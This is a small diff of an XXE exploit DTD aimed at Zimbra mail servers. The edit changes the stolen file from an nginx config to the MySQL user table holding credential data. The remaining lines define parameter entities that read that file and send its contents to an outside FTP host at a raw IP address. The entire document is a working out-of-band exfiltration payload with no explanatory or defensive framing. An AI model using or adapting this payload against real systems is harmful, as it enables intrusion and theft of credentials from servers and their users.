@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///opt/zimbra/conf/nginx/includes/nginx.conf.zmlookup">
+<!ENTITY % payload SYSTEM "file:///opt/zimbra/db/data/mysql/user.MYD">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://118.184.55.248:110/%payload;'>">
 %int;
 %trick;
